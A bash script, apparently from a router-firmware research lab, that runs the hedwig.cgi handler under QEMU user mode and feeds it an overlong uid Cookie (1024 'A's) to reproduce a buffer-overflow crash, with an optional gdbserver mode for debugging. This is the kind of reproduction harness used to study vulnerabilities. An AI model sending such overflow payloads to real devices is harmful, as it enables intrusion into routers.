#!/usr/bin/env bash
# 方式 C:QEMU user 模式,只跑 cgibin,用于快速复现 hedwig.cgi 崩溃
#
# 原理:hedwig.cgi 是 /htdocs/cgibin 的软链,qemu 用 -0 伪造 argv[0] 让 cgibin
#       进入 hedwigcgi_main 分支,再把超长 Cookie 通过 HTTP_COOKIE 喂进去。
set -euo pipefail

ARCH="${ARCH:-mipsel}"
ROOTFS="${ROOTFS:-/rootfs}"
CGI="${CGI:-/htdocs/web/hedwig.cgi}"
MODE="${MODE:-run}"                       # run | gdb
PAYLOAD="${PAYLOAD:-$(python3 -c 'print("A"*1024)')}"

QEMU="qemu-${ARCH}-static"
command -v "$QEMU" >/dev/null 2>&1 || {
    echo "[x] 没有 $QEMU;可用的是:" >&2
    ls /usr/bin/qemu-*static 2>/dev/null | head -n 20 >&2
    exit 1
}

[ -d "$ROOTFS" ] || { echo "[x] rootfs 不存在: $ROOTFS(先跑 init_env.sh)" >&2; exit 1; }

TARGET="$ROOTFS$CGI"
# 软链可能指向绝对路径 /htdocs/cgibin,在宿主上解析不到,退回真实二进制
if [ ! -x "$TARGET" ]; then
    TARGET="$ROOTFS/htdocs/cgibin"
fi
[ -x "$TARGET" ] || { echo "[x] 找不到 cgibin,检查 $ROOTFS/htdocs/" >&2; exit 1; }

echo "[*] $QEMU -L $ROOTFS"
echo "[*] 入口: ${TARGET#"$ROOTFS"}(argv[0]=$CGI)"
echo "[*] Cookie: uid=<${#PAYLOAD} 字节>"

ARGS=(
    -L "$ROOTFS"
    -0 "$CGI"
    -E "REQUEST_METHOD=POST"
    -E "SCRIPT_NAME=$CGI"
    -E "REQUEST_URI=$CGI"
    -E "CONTENT_TYPE=application/x-www-form-urlencoded"
    -E "CONTENT_LENGTH=0"
    -E "SERVER_PORT=80"
    -E "SERVER_NAME=192.168.0.1"
    -E "HTTP_COOKIE=uid=$PAYLOAD"
)

if [ "$MODE" = "gdb" ]; then
    ARGS+=(-g 6666)
    echo "[*] gdbserver 监听 6666,等待 gdb-multiarch 连接"
fi

set +e
"$QEMU" "${ARGS[@]}" "$TARGET"
RC=$?
set -e

echo "[*] 退出码: $RC"
if [ "$RC" -ge 128 ] || [ "$RC" -eq 139 ]; then
    echo "[!] 以信号退出(段错误/非法指令),说明 payload 已越过边界"
fi
exit "$RC"
